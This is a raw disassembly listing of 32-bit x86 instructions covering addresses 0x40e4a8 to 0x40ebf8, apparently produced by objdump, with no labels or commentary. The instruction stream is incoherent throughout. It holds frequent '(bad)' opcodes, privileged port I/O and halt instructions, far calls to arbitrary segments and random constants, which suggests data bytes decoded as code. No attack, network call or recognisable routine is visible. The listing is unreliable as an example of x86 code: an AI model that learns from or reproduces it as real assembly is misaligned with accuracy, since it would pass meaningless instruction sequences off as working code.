  40e4a8:	lds    eax,FWORD PTR [ebp-0x4e]
  40e4ab:	pop    eax
  40e4ac:	test   DWORD PTR [edx-0x79],eax
  40e4af:	xchg   esi,eax
  40e4b0:	mov    dl,0xb1
  40e4b2:	outs   dx,BYTE PTR ds:[esi]
  40e4b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e4b4:	jmp    0xad7fdd17
  40e4b9:	mov    ebp,0xec8ecdd5
  40e4be:	imul   ebp,ebp,0x42
  40e4c1:	dec    esi
  40e4c2:	xchg   ebp,eax
  40e4c3:	xchg   ecx,eax
  40e4c4:	outs   dx,BYTE PTR ds:[esi]
  40e4c5:	ret    
  40e4c6:	adc    ah,BYTE PTR [eax-0x50]
  40e4c9:	push   es
  40e4ca:	jmp    0x1dc3bec2
  40e4cf:	mov    edx,0xc0cecd34
  40e4d4:	out    dx,al
  40e4d5:	cmp    eax,0xc4eb87c0
  40e4da:	fld    TBYTE PTR [ecx]
  40e4dc:	mov    edx,0xa0e0bcf
  40e4e1:	adc    DWORD PTR [edi-0x6bdc3fb8],edx
  40e4e7:	fdivr  st,st(7)
  40e4e9:	mov    ds:0x9451fc0d,al
  40e4ee:	mov    ebp,esp
  40e4f0:	shl    bl,0x5b
  40e4f3:	pusha  
  40e4f4:	lea    ebx,[edi]
  40e4f6:	test   cl,0x14
  40e4f9:	out    dx,eax
  40e4fa:	les    edi,FWORD PTR [ebx-0x52cf94d3]
  40e500:	xor    DWORD PTR [edi],esp
  40e502:	xchg   edi,eax
  40e503:	sub    eax,0x726919af
  40e508:	arpl   dx,dx
  40e50a:	(bad)  
  40e50b:	fild   QWORD PTR [ebp+0x7b]
  40e50e:	daa    
  40e50f:	fild   WORD PTR [ebx-0x23]
  40e512:	jo     0x40e559
  40e514:	inc    edi
  40e515:	xor    DWORD PTR [edx+ebp*4+0x4f930f80],esi
  40e51c:	mov    ah,0xcd
  40e51e:	dec    DWORD PTR [ecx-0x6fe748f0]
  40e524:	test   BYTE PTR [edi],ah
  40e526:	dec    ebx
  40e527:	ss (bad) 
  40e529:	mov    ds:0x76dc4f6e,eax
  40e52e:	inc    edx
  40e52f:	or     DWORD PTR [edx],esi
  40e531:	sbb    cl,BYTE PTR [edx+0x3a]
  40e534:	adc    al,0x60
  40e536:	sub    al,BYTE PTR [edi+0x5f]
  40e539:	push   ds
  40e53a:	push   ds
  40e53b:	ds push edx
  40e53d:	push   cs
  40e53e:	mov    ecx,DWORD PTR [edx]
  40e540:	adc    ebp,DWORD PTR [eax]
  40e542:	xchg   ebx,eax
  40e543:	or     BYTE PTR [esi-0x12],0x1f
  40e547:	or     eax,0x64a62463
  40e54c:	push   edx
  40e54d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e54e:	loop   0x40e5bf
  40e550:	push   edi
  40e551:	pop    ebp
  40e552:	mov    eax,ds:0x3d45b3f9
  40e557:	je     0x40e568
  40e559:	(bad)  [esi]
  40e55b:	test   DWORD PTR ss:[edx+0x11164cbe],edi
  40e562:	mov    esp,DWORD PTR [edx-0x2e]
  40e565:	add    BYTE PTR [esi+edx*4+0x40],0xa0
  40e56a:	inc    eax
  40e56b:	std    
  40e56c:	imul   esp,ecx,0x3f22a986
  40e572:	ror    ecx,1
  40e574:	jecxz  0x40e53c
  40e576:	cmp    ch,bh
  40e578:	pushf  
  40e579:	shl    edi,cl
  40e57b:	inc    edi
  40e57c:	stc    
  40e57d:	fldcw  WORD PTR [ebx]
  40e57f:	test   al,0x4a
  40e581:	sub    DWORD PTR [edx],esi
  40e583:	mov    al,0x5c
  40e585:	scas   eax,DWORD PTR es:[edi]
  40e586:	add    eax,0x4adc8933
  40e58b:	stc    
  40e58c:	and    bh,BYTE PTR [ecx+0x983ecdc]
  40e592:	jne    0x40e5f7
  40e594:	add    edx,ebp
  40e596:	iret   
  40e597:	pop    edx
  40e598:	aas    
  40e599:	popa   
  40e59a:	retf   
  40e59b:	popf   
  40e59c:	sahf   
  40e59d:	and    al,0x48
  40e59f:	out    dx,eax
  40e5a0:	xor    al,0x59
  40e5a2:	mov    ds:0xca324d31,al
  40e5a7:	push   es
  40e5a8:	cwde   
  40e5a9:	mov    dl,0xa5
  40e5ab:	xchg   ecx,eax
  40e5ac:	nop
  40e5ad:	(bad)  
  40e5ae:	xor    eax,0x9f30b110
  40e5b3:	and    eax,0x719e0f45
  40e5b8:	xor    eax,0x53a1ae52
  40e5bd:	or     bl,BYTE PTR [esi+0x1cea55c5]
  40e5c3:	xor    DWORD PTR [eax-0x4e],eax
  40e5c6:	adc    ebx,DWORD PTR [ecx]
  40e5c8:	scas   eax,DWORD PTR es:[edi]
  40e5c9:	mov    dl,BYTE PTR [ebx+ecx*8+0x5d]
  40e5cd:	retf   
  40e5ce:	sbb    bh,BYTE PTR [edx+0x5a005cf4]
  40e5d4:	pop    es
  40e5d5:	xlat   BYTE PTR ds:[ebx]
  40e5d6:	retf   
  40e5d7:	lea    esi,[edi]
  40e5d9:	rcr    ch,0xa2
  40e5dc:	enter  0xcb4e,0x30
  40e5e0:	push   esi
  40e5e1:	aaa    
  40e5e2:	mov    dl,0x5c
  40e5e4:	jnp    0x40e644
  40e5e6:	pop    ebp
  40e5e7:	ds mov ebp,0xb18a29d
  40e5ed:	in     al,0xbd
  40e5ef:	ins    BYTE PTR es:[edi],dx
  40e5f0:	aam    0xcf
  40e5f2:	loop   0x40e622
  40e5f4:	jg     0x40e664
  40e5f6:	aam    0x90
  40e5f8:	ret    0xee6
  40e5fb:	inc    ebx
  40e5fc:	ret    0x6137
  40e5ff:	je     0x40e5b4
  40e601:	jo     0x40e5d1
  40e603:	pusha  
  40e604:	sub    DWORD PTR [esi-0x5f],0xcae7af44
  40e60b:	mov    ah,0x4f
  40e60d:	(bad)  
  40e60e:	ror    DWORD PTR [edx+0x5a],0x11
  40e612:	shl    DWORD PTR [ecx-0x4c],0xa1
  40e616:	call   0x36b5:0x42652900
  40e61d:	add    al,0xec
  40e61f:	mov    bh,0x67
  40e621:	fs and bl,bh
  40e624:	and    ecx,DWORD PTR [eax]
  40e626:	retf   0x183a
  40e629:	and    al,0xa3
  40e62b:	mov    DWORD PTR [ebx-0x14e36262],ecx
  40e631:	mov    bh,0x1f
  40e633:	xor    ecx,DWORD PTR [edi+0x4d6faa27]
  40e639:	or     BYTE PTR [ebx+0x68dead20],0x38
  40e640:	(bad)  
  40e641:	jno    0x40e6a0
  40e643:	cmp    al,0xa9
  40e645:	cmp    al,ch
  40e647:	jge    0x40e6a8
  40e649:	call   0xd2d3:0xc2f1bdbb
  40e650:	ss clc 
  40e652:	add    BYTE PTR [esp+ebx*2+0x66],ah
  40e656:	xchg   edx,eax
  40e657:	push   cs
  40e658:	js     0x40e6aa
  40e65a:	clc    
  40e65b:	sbb    dh,BYTE PTR [esi]
  40e65d:	pop    esp
  40e65e:	cdq    
  40e65f:	dec    edi
  40e660:	mov    ebp,0x6c0186d4
  40e665:	add    bh,BYTE PTR fs:[ebx]
  40e668:	inc    edi
  40e669:	mov    ch,0x8
  40e66b:	pop    edx
  40e66c:	push   edx
  40e66d:	push   ebp
  40e66e:	hlt    
  40e66f:	jnp    0x40e663
  40e671:	imul   ecx,DWORD PTR [esi+0x327a7c4c],0x3f
  40e678:	mov    DWORD PTR [edi],esp
  40e67a:	add    dl,dl
  40e67c:	leave  
  40e67d:	popf   
  40e67e:	cs hlt 
  40e680:	mov    ecx,0xf031c9fd
  40e685:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e686:	xor    DWORD PTR [ebx],ebp
  40e688:	in     eax,0x31
  40e68a:	xchg   ecx,eax
  40e68b:	retf   
  40e68c:	xchg   esp,eax
  40e68d:	add    BYTE PTR [edi],dl
  40e68f:	pop    ss
  40e690:	pop    esi
  40e691:	and    BYTE PTR [ecx],0x34
  40e694:	and    eax,0x4e49d238
  40e699:	ins    BYTE PTR es:[edi],dx
  40e69a:	test   DWORD PTR [edx-0x4a694a85],0x3e6f41c8
  40e6a4:	pop    esi
  40e6a5:	(bad)  
  40e6a6:	and    DWORD PTR [ecx-0x48],ebx
  40e6a9:	addr16 (bad) 
  40e6ab:	arpl   WORD PTR [ecx],cx
  40e6ad:	mov    ecx,0xbeb45d46
  40e6b2:	ret    
  40e6b3:	cmp    ch,bl
  40e6b5:	inc    esi
  40e6b6:	arpl   WORD PTR [esi+0x60250a30],bp
  40e6bc:	cmp    DWORD PTR [edi],ecx
  40e6be:	sub    eax,0x17a5214f
  40e6c3:	stos   BYTE PTR es:[edi],al
  40e6c4:	(bad)  
  40e6c5:	push   edi
  40e6c6:	mov    ebx,0xafb69019
  40e6cb:	push   ds
  40e6cc:	stc    
  40e6cd:	shr    DWORD PTR [ecx],cl
  40e6cf:	adc    al,0x18
  40e6d1:	call   0x7037701
  40e6d6:	cmp    al,0x8b
  40e6d8:	test   eax,0x49a069c
  40e6dd:	cs rcl esp,0x9d
  40e6e1:	out    dx,al
  40e6e2:	add    eax,0xe9f684be
  40e6e7:	push   ss
  40e6e8:	jl     0x40e728
  40e6ea:	add    eax,0x86cb2615
  40e6ef:	push   cs
  40e6f0:	int3   
  40e6f1:	dec    esp
  40e6f2:	imul   esp,DWORD PTR [edx-0x2f700ec9],0xffffffc7
  40e6f9:	xchg   ecx,edx
  40e6fb:	cmp    ebx,esp
  40e6fd:	mov    DWORD PTR es:[eax+0x54],edi
  40e701:	adc    al,0x6a
  40e703:	lods   eax,DWORD PTR ds:[esi]
  40e704:	cs clc 
  40e706:	mov    eax,0x9d2313e
  40e70b:	sar    DWORD PTR [ebx],cl
  40e70d:	add    cl,BYTE PTR [ecx+0x7b50f2f8]
  40e713:	and    al,0x49
  40e715:	(bad)  
  40e716:	fucom  st(2)
  40e718:	mov    WORD PTR [esi],fs
  40e71a:	pop    esp
  40e71b:	mov    DWORD PTR [esi],ebp
  40e71d:	push   ecx
  40e71e:	sbb    esp,DWORD PTR [eax+edi*1-0xade7632]
  40e725:	and    BYTE PTR [esi+0x30],ch
  40e728:	jecxz  0x40e6f7
  40e72a:	jecxz  0x40e6fb
  40e72c:	neg    BYTE PTR [edi+eax*4+0x421f32c]
  40e733:	int3   
  40e734:	dec    edx
  40e735:	sbb    ah,BYTE PTR [edi+0x2c]
  40e738:	dec    edi
  40e739:	mov    edx,0x4ead2945
  40e73e:	sti    
  40e73f:	jle    0x40e734
  40e741:	mov    ebx,0xcae20dcf
  40e746:	adc    BYTE PTR [edx],ah
  40e748:	rcl    DWORD PTR [esi],1
  40e74a:	pop    ebx
  40e74b:	fist   WORD PTR ds:0x4367b501
  40e751:	push   0xffffffee
  40e753:	lahf   
  40e754:	cld    
  40e755:	jne    0x40e75f
  40e757:	adc    ebp,DWORD PTR [edx+0x6b]
  40e75a:	mov    ds:0xcf759bb,al
  40e760:	push   edx
  40e761:	pop    ds
  40e762:	lahf   
  40e763:	mov    ecx,0x2e511aab
  40e768:	jmp    0xabcfe0d7
  40e76d:	out    dx,al
  40e76e:	sub    dh,BYTE PTR [ebx]
  40e770:	xchg   ecx,eax
  40e771:	rcl    BYTE PTR [ecx-0x7a],1
  40e774:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e775:	jmp    0x40e70e
  40e777:	sub    eax,0x8e3263ba
  40e77c:	test   al,0x53
  40e77e:	das    
  40e77f:	rcl    bl,cl
  40e781:	push   ebx
  40e782:	add    cl,BYTE PTR [edx+0x66]
  40e785:	scas   al,BYTE PTR es:[edi]
  40e786:	jle    0x40e7e3
  40e788:	and    ecx,edi
  40e78a:	jl     0x40e77e
  40e78c:	inc    edx
  40e78d:	daa    
  40e78e:	shl    DWORD PTR [ecx-0x5c49d583],cl
  40e794:	popa   
  40e795:	push   0x6139ae32
  40e79a:	rcl    BYTE PTR [eax+0x3bf4122a],1
  40e7a0:	jp     0x40e7dd
  40e7a2:	ja     0x40e7f7
  40e7a4:	dec    edi
  40e7a5:	std    
  40e7a6:	pop    ds
  40e7a7:	jbe    0x40e7ba
  40e7a9:	mov    al,0x8a
  40e7ab:	push   0xffffffa1
  40e7ad:	mov    bh,0x92
  40e7af:	pusha  
  40e7b0:	cmp    al,0x60
  40e7b2:	mov    edi,0x8db913d
  40e7b7:	push   esi
  40e7b8:	mov    ds:0xd87b2f93,al
  40e7bd:	jne    0x40e74b
  40e7bf:	inc    edx
  40e7c0:	mov    eax,0xc2919da9
  40e7c5:	xchg   edx,eax
  40e7c6:	shl    al,cl
  40e7c8:	adc    dh,bl
  40e7ca:	lods   al,BYTE PTR ds:[esi]
  40e7cb:	mov    ecx,0xd928a58e
  40e7d0:	dec    edi
  40e7d1:	pop    ss
  40e7d2:	cmp    ax,0x85e6
  40e7d6:	ds pop ds
  40e7d8:	sti    
  40e7d9:	ss scas al,BYTE PTR es:[edi]
  40e7db:	mov    al,ds:0x876fd22
  40e7e0:	adc    al,0x1f
  40e7e2:	test   DWORD PTR [edi-0x3f],esi
  40e7e5:	pop    ebx
  40e7e6:	in     eax,dx
  40e7e7:	mov    dh,0x64
  40e7e9:	add    eax,0xc9320f5a
  40e7ee:	mov    edi,0xf3899a99
  40e7f3:	xchg   ecx,eax
  40e7f4:	jns    0x40e7fb
  40e7f6:	add    al,0x6e
  40e7f8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e7f9:	pop    ss
  40e7fa:	jg     0x40e852
  40e7fc:	push   es
  40e7fd:	push   ecx
  40e7fe:	pop    ebp
  40e800:	adc    ebp,DWORD PTR [esi-0x31]
  40e803:	and    dl,BYTE PTR [eax-0x51]
  40e806:	pop    esp
  40e807:	xchg   DWORD PTR [ecx+esi*4-0x1ad848c9],esi
  40e80e:	rcr    DWORD PTR [ecx+edx*4],0x8a
  40e812:	mov    bh,0x67
  40e814:	pop    esi
  40e815:	stos   DWORD PTR es:[edi],eax
  40e816:	in     al,dx
  40e817:	push   cs
  40e818:	dec    ebx
  40e819:	aad    0xd5
  40e81b:	das    
  40e81c:	imul   edi,ebp,0xffffffb6
  40e81f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e820:	and    ecx,DWORD PTR [edi]
  40e822:	xlat   BYTE PTR ds:[ebx]
  40e823:	and    eax,0x53d9cb
  40e828:	push   esp
  40e829:	and    edx,DWORD PTR [eax-0x1ef8f60a]
  40e82f:	mov    ah,BYTE PTR [edi+eiz*4+0x66db883c]
  40e836:	loop   0x40e82a
  40e838:	fimul  WORD PTR [edi+edx*4-0x4aa471c3]
  40e83f:	les    edi,FWORD PTR [ebx-0x30bacd98]
  40e845:	test   BYTE PTR [edi-0x14],dl
  40e848:	xchg   edx,eax
  40e849:	push   ds
  40e84a:	into   
  40e84b:	inc    edx
  40e84c:	pop    ebx
  40e84d:	jnp    0x40e84b
  40e84f:	idiv   ch
  40e851:	and    ch,BYTE PTR [edi+0x18]
  40e854:	add    edi,DWORD PTR [edx]
  40e856:	xor    DWORD PTR ds:0xfd68330b,eax
  40e85c:	adc    ah,BYTE PTR [ebx]
  40e85e:	jg     0x40e828
  40e860:	aad    0xa6
  40e862:	mov    edi,0x29fb598e
  40e867:	mov    ecx,0x86c8a7c5
  40e86c:	test   al,0x99
  40e86e:	loope  0x40e8aa
  40e870:	pop    eax
  40e871:	in     eax,dx
  40e872:	mov    ch,0xed
  40e874:	dec    esi
  40e875:	repz adc DWORD PTR [esi-0x9],ecx
  40e879:	and    DWORD PTR [edx+0x15132337],0x9bcfcfe9
  40e883:	bnd ja 0x40e837
  40e886:	pop    eax
  40e887:	jl     0x40e8d9
  40e889:	pusha  
  40e88a:	addr16 jo 0x40e8a9
  40e88d:	mov    bh,0x8b
  40e88f:	push   ds
  40e890:	std    
  40e891:	mov    ah,0xfc
  40e893:	mov    ds,WORD PTR [esi+0x7e00dacb]
  40e899:	aas    
  40e89a:	cmp    esi,DWORD PTR [ebx+0x4f22adba]
  40e8a0:	add    dl,ch
  40e8a2:	inc    esi
  40e8a3:	stos   BYTE PTR es:[edi],al
  40e8a4:	ror    DWORD PTR [ebp+0x6e],cl
  40e8a7:	mov    cl,0x61
  40e8a9:	shr    BYTE PTR cs:[eax],0xe8
  40e8ad:	push   0xffffff88
  40e8af:	cld    
  40e8b0:	scas   eax,DWORD PTR es:[edi]
  40e8b1:	add    BYTE PTR [esi+0x25017be],0xa2
  40e8b8:	adc    al,0xad
  40e8ba:	mov    eax,ds:0x5b7f3b19
  40e8bf:	call   0x2030:0x4dd27f00
  40e8c6:	sub    BYTE PTR [ecx],ah
  40e8c8:	sbb    al,0x87
  40e8ca:	dec    eax
  40e8cb:	test   DWORD PTR [edi+0x30],edx
  40e8ce:	jecxz  0x40e875
  40e8d0:	jo     0x40e874
  40e8d2:	xor    al,0x78
  40e8d4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e8d5:	jne    0x40e929
  40e8d7:	adc    BYTE PTR [edi+ecx*2],ch
  40e8da:	jne    0x40e8be
  40e8dc:	add    eax,0x6af04b54
  40e8e1:	nop
  40e8e2:	cmp    DWORD PTR [ebp+eiz*1-0x66eb108c],ecx
  40e8e9:	mov    dh,0x28
  40e8eb:	or     eax,0xa0e6f520
  40e8f0:	ins    DWORD PTR es:[edi],dx
  40e8f1:	pop    edx
  40e8f2:	adc    al,0xae
  40e8f4:	dec    ecx
  40e8f5:	and    al,0x1e
  40e8f7:	push   ecx
  40e8f8:	mov    ds,WORD PTR [eax]
  40e8fa:	mov    cl,BYTE PTR [edx]
  40e8fc:	sub    DWORD PTR [ebx],esi
  40e8fe:	shl    BYTE PTR [eax-0x6083bb58],0x8d
  40e905:	xor    al,0x3e
  40e907:	ret    
  40e908:	mov    ah,0x58
  40e90a:	mov    bl,0xb9
  40e90c:	cwde   
  40e90d:	int    0x40
  40e90f:	cmp    DWORD PTR ds:0x978fbaa3,esi
  40e915:	dec    edi
  40e916:	pop    es
  40e917:	in     al,dx
  40e918:	loop   0x40e8e1
  40e91a:	adc    eax,0x28e4dabe
  40e91f:	jmp    DWORD PTR [esi+0x3f]
  40e922:	mov    ebx,0xcb2c3a33
  40e927:	jp     0x40e96b
  40e929:	lods   eax,DWORD PTR ds:[esi]
  40e92a:	ror    BYTE PTR [ecx+0x6a434f0b],0x34
  40e931:	mov    ds:0x833c7bb9,eax
  40e936:	xor    DWORD PTR [ecx+0x806cdad],ebx
  40e93c:	outs   dx,DWORD PTR ds:[esi]
  40e93d:	mov    edx,0xf7e57844
  40e942:	pop    ecx
  40e943:	mov    esp,0x2dbe8802
  40e948:	adc    DWORD PTR [ecx],esi
  40e94a:	jbe    0x40e91d
  40e94c:	xor    BYTE PTR [edx],al
  40e94e:	cli    
  40e94f:	das    
  40e950:	xchg   esi,eax
  40e951:	sahf   
  40e952:	and    DWORD PTR [ebx-0x67],esp
  40e955:	js     0x40e906
  40e957:	mov    eax,edx
  40e959:	into   
  40e95a:	jnp    0x40e8f4
  40e95c:	sub    BYTE PTR [edx],dh
  40e95e:	or     eax,0xef3e6ea9
  40e963:	fisubr WORD PTR [ebx]
  40e965:	mov    ds:0xda6c3714,eax
  40e96a:	in     eax,0xf
  40e96c:	scas   eax,DWORD PTR es:[edi]
  40e96d:	fsubrp st(3),st
  40e96f:	out    0xc0,al
  40e971:	std    
  40e972:	inc    ebx
  40e973:	mov    eax,ds:0x3011f468
  40e978:	xor    edi,DWORD PTR [esi-0x629555ab]
  40e97e:	repnz loop 0x40e9e0
  40e981:	sub    al,bl
  40e983:	out    0x7c,al
  40e985:	push   eax
  40e986:	jnp    0x40e97d
  40e988:	add    BYTE PTR [edi],0x20
  40e98b:	inc    esp
  40e98c:	fcmove st,st(1)
  40e98e:	call   0xb270:0x2920ffb1
  40e995:	call   0x6092:0x3c5d1730
  40e99c:	lock push eax
  40e99e:	dec    BYTE PTR cs:[edx-0x57]
  40e9a2:	test   ebx,edx
  40e9a4:	dec    esp
  40e9a5:	cmp    eax,0x44b4d05d
  40e9aa:	or     ebx,DWORD PTR [esi]
  40e9ac:	mov    ecx,0x34e982c7
  40e9b1:	dec    edx
  40e9b2:	hlt    
  40e9b3:	out    0x41,al
  40e9b5:	dec    edx
  40e9b6:	es push edx
  40e9b8:	fnstsw WORD PTR [ecx-0x20]
  40e9bb:	shl    DWORD PTR [ebp-0x65],0x41
  40e9bf:	cs stos BYTE PTR es:[edi],al
  40e9c1:	cmp    eax,0xdcc0c29b
  40e9c6:	arpl   WORD PTR [edx-0xfa651a4],di
  40e9cc:	xchg   ecx,eax
  40e9cd:	and    edi,ecx
  40e9cf:	cmp    esp,DWORD PTR [ebx]
  40e9d1:	and    al,0x4c
  40e9d3:	jle    0x40e95f
  40e9d5:	loop   0x40ea21
  40e9d7:	gs jne 0x40e9b0
  40e9da:	sub    DWORD PTR [ebx],eax
  40e9dc:	mov    al,0x41
  40e9de:	(bad)  
  40e9df:	mov    dh,0x14
  40e9e1:	push   edx
  40e9e2:	push   0x6c
  40e9e4:	addr16 xchg edx,eax
  40e9e6:	imul   ebx,DWORD PTR [esi+ebx*4+0x37c1ce39],0xbb8b3ed9
  40e9f1:	cmp    esi,eax
  40e9f3:	sar    DWORD PTR [eax],0x4f
  40e9f6:	jle    0x40e9e3
  40e9f8:	jb     0x40e9dd
  40e9fa:	adc    dl,BYTE PTR [esi+0x5e64d1a3]
  40ea00:	cs inc edx
  40ea02:	jae    0x40e98d
  40ea04:	ret    
  40ea05:	cmp    BYTE PTR [esi],al
  40ea07:	xchg   ecx,eax
  40ea08:	rcr    DWORD PTR [esi+0x2e],cl
  40ea0b:	inc    esi
  40ea0c:	rcl    DWORD PTR [ebx-0x5a],1
  40ea0f:	mov    WORD PTR [edi+0x32e26261],es
  40ea15:	test   DWORD PTR [edi+0x1d35368f],0xf5c22db7
  40ea1f:	icebp  
  40ea20:	icebp  
  40ea21:	jmp    0xc59d2496
  40ea26:	xor    eax,0xa66087d8
  40ea2b:	pop    es
  40ea2c:	cwde   
  40ea2d:	(bad)  
  40ea2e:	sbb    bl,BYTE PTR [eax]
  40ea30:	test   DWORD PTR [edi+0x68],ebp
  40ea33:	mov    edx,cs
  40ea35:	lods   eax,DWORD PTR ds:[esi]
  40ea36:	sti    
  40ea37:	rcr    ebx,0x0
  40ea3a:	nop
  40ea3b:	adc    ebp,DWORD PTR [ebx+0x1a]
  40ea3e:	fst    DWORD PTR [ebx+0x46c10c77]
  40ea44:	stos   BYTE PTR es:[edi],al
  40ea45:	pop    esp
  40ea46:	mov    edi,0xbe8f51ee
  40ea4b:	lea    edi,[esp+edi*8]
  40ea4e:	mov    ebx,0x236ceae0
  40ea53:	xchg   ebp,eax
  40ea54:	xchg   edi,esp
  40ea56:	lds    esp,FWORD PTR [esi]
  40ea58:	ss mov bl,dl
  40ea5b:	pop    edi
  40ea5c:	or     DWORD PTR [edx+0x20],0x4f
  40ea60:	aad    0xfb
  40ea62:	aad    0xdd
  40ea64:	sub    al,0xec
  40ea66:	or     ebx,0x8116fdbb
  40ea6c:	addr16 call 0xcc5381ae
  40ea72:	mov    edx,0x126939db
  40ea77:	fadd   DWORD PTR [edi+0x22bce6dd]
  40ea7d:	dec    BYTE PTR [eax-0x50c1f94a]
  40ea83:	xchg   esi,eax
  40ea84:	popf   
  40ea85:	rcr    BYTE PTR [eax+edi*2+0x14],1
  40ea89:	mov    ch,0x15
  40ea8b:	add    DWORD PTR [eax],edi
  40ea8d:	sub    eax,0x2840df65
  40ea92:	fcmovbe st,st(3)
  40ea94:	in     al,dx
  40ea95:	push   edi
  40ea96:	xchg   esp,eax
  40ea97:	sar    BYTE PTR [ebx],cl
  40ea99:	enter  0xca87,0x9d
  40ea9d:	jbe    0x40eb1e
  40ea9f:	dec    esp
  40eaa0:	jne    0x40ea61
  40eaa2:	ss jp  0x40eaad
  40eaa5:	mov    cl,0xd
  40eaa7:	mov    al,0x42
  40eaa9:	mov    BYTE PTR [esi+eax*8],al
  40eaac:	int3   
  40eaad:	push   0x2
  40eaaf:	inc    esi
  40eab0:	jl     0x40ea99
  40eab2:	xchg   BYTE PTR [edx-0xe107421],bl
  40eab8:	popf   
  40eab9:	xchg   edi,eax
  40eaba:	int    0x8a
  40eabc:	mov    ebp,0x64a65363
  40eac1:	sub    al,0xb6
  40eac3:	and    al,0x2a
  40eac5:	mov    ds:0xfd1d3571,eax
  40eaca:	jmp    0x40ea63
  40eacc:	fcomi  st,st(0)
  40eace:	les    ebp,FWORD PTR [edx+0x420197cf]
  40ead4:	les    ecx,FWORD PTR [eax-0x34bb0ef7]
  40eada:	or     DWORD PTR [edx+eax*2],ebp
  40eadd:	cmp    DWORD PTR [edx],esi
  40eadf:	sar    BYTE PTR [ecx],cl
  40eae1:	aaa    
  40eae2:	add    DWORD PTR [edi-0x70],esi
  40eae5:	jo     0x40eadf
  40eae7:	lods   eax,DWORD PTR ds:[esi]
  40eae8:	dec    eax
  40eae9:	repnz cmp ebx,ebx
  40eaec:	sbb    ebx,eax
  40eaee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40eaef:	adc    DWORD PTR [eax+eax*1-0x26],edi
  40eaf3:	mov    al,0x8
  40eaf5:	jae    0x40ea8a
  40eaf7:	pushf  
  40eaf8:	dec    ebx
  40eaf9:	xor    BYTE PTR [eax-0x6a],bh
  40eafc:	pop    esp
  40eafd:	or     BYTE PTR [ebx],ah
  40eaff:	pop    esp
  40eb00:	iret   
  40eb01:	mov    esi,0x9dc933dc
  40eb06:	mov    bh,0x58
  40eb08:	and    BYTE PTR [ebp-0x5056a1d3],0x55
  40eb0f:	retf   0xbe8f
  40eb12:	gs xchg ebp,eax
  40eb14:	push   edx
  40eb15:	inc    esi
  40eb16:	jno    0x40eb3c
  40eb18:	dec    ebx
  40eb19:	call   0xe70f:0x6abe1500
  40eb20:	jp     0x40eb16
  40eb22:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40eb23:	test   dh,al
  40eb25:	add    edx,DWORD PTR [ebp+0x2ffce0b0]
  40eb2b:	aas    
  40eb2c:	rcr    DWORD PTR [ebx+edi*8],1
  40eb2f:	adc    esp,DWORD PTR [ebp+0xd]
  40eb32:	dec    esp
  40eb33:	std    
  40eb34:	and    al,0x1e
  40eb36:	daa    
  40eb37:	aaa    
  40eb38:	cmp    BYTE PTR [ebp-0x50d07118],0x8c
  40eb3f:	cwde   
  40eb40:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40eb41:	xor    ah,BYTE PTR [ebp+0x71]
  40eb44:	jbe    0x40eb51
  40eb46:	imul   edi,DWORD PTR [edi+ebx*2-0x2fefc32],0x22
  40eb4e:	and    esi,DWORD PTR [esi+0x76]
  40eb51:	xchg   esi,eax
  40eb52:	stos   BYTE PTR es:[edi],al
  40eb53:	mov    edx,0x3a74272e
  40eb58:	mov    eax,ds:0x421e8303
  40eb5d:	int3   
  40eb5e:	in     al,0x4a
  40eb60:	pop    ss
  40eb61:	dec    eax
  40eb62:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40eb63:	fsubr  DWORD PTR [edx]
  40eb65:	adc    eax,DWORD PTR ds:0x49d72758
  40eb6b:	and    dh,BYTE PTR [ebp+0xae0db0b]
  40eb71:	and    BYTE PTR [edi+0x7c],dl
  40eb74:	dec    esp
  40eb75:	sbb    BYTE PTR [eax+0x58],dh
  40eb78:	fist   WORD PTR [eax]
  40eb7a:	jp     0x40eb84
  40eb7c:	sub    al,0x8f
  40eb7e:	out    0xad,al
  40eb80:	ret    0x2ff1
  40eb83:	adc    DWORD PTR [ebp+ebp*1-0x26],esi
  40eb87:	inc    eax
  40eb88:	push   es
  40eb89:	dec    ebx
  40eb8a:	jb     0x40eb45
  40eb8c:	frstor [edx+0x39]
  40eb8f:	js     0x40eb5d
  40eb91:	and    eax,ebx
  40eb93:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40eb94:	ds pop ecx
  40eb96:	daa    
  40eb97:	out    dx,eax
  40eb98:	shr    ch,cl
  40eb9a:	adc    BYTE PTR [eax],bh
  40eb9c:	adc    al,0x56
  40eb9e:	jp     0x40ebf6
  40eba0:	rcl    al,0xcc
  40eba3:	pop    eax
  40eba4:	inc    ecx
  40eba5:	cs cld 
  40eba7:	bound  edi,QWORD PTR [ebx-0x39]
  40ebaa:	inc    esi
  40ebab:	mov    bh,0xc1
  40ebad:	out    0x35,al
  40ebaf:	sbb    al,BYTE PTR [edx+ecx*4]
  40ebb2:	fwait
  40ebb3:	xchg   edx,eax
  40ebb4:	dec    edx
  40ebb5:	push   ds
  40ebb6:	imul   ebp,DWORD PTR [eax+0x7a463d9],0xa2b7cec3
  40ebc0:	lods   al,BYTE PTR ds:[esi]
  40ebc1:	fs aas 
  40ebc3:	xchg   ebp,eax
  40ebc4:	jg     0x40eb58
  40ebc6:	push   es
  40ebc7:	mov    esi,0xc50c2d66
  40ebcc:	ja     0x40ebb6
  40ebce:	test   al,0x12
  40ebd0:	mov    al,0xef
  40ebd2:	jno    0x40ec09
  40ebd4:	jge    0x40ec41
  40ebd6:	out    0xf6,eax
  40ebd8:	push   cs
  40ebd9:	and    DWORD PTR [ecx+0x7c],ebx
  40ebdc:	sbb    esi,DWORD PTR [edi+0x2d73052]
  40ebe2:	test   al,0x88
  40ebe4:	inc    DWORD PTR [edi-0x8]
  40ebe7:	cmc    
  40ebe8:	mov    bh,0xe
  40ebea:	xchg   edi,eax
  40ebeb:	icebp  
  40ebec:	pop    edi
  40ebed:	es xchg ch,ch
  40ebf0:	cmp    eax,0x72be60ed
  40ebf5:	icebp  
  40ebf6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ebf7:	inc    ebx
  40ebf8:	or     DWORD PTR [eax+ecx*2-0x71424480],esi
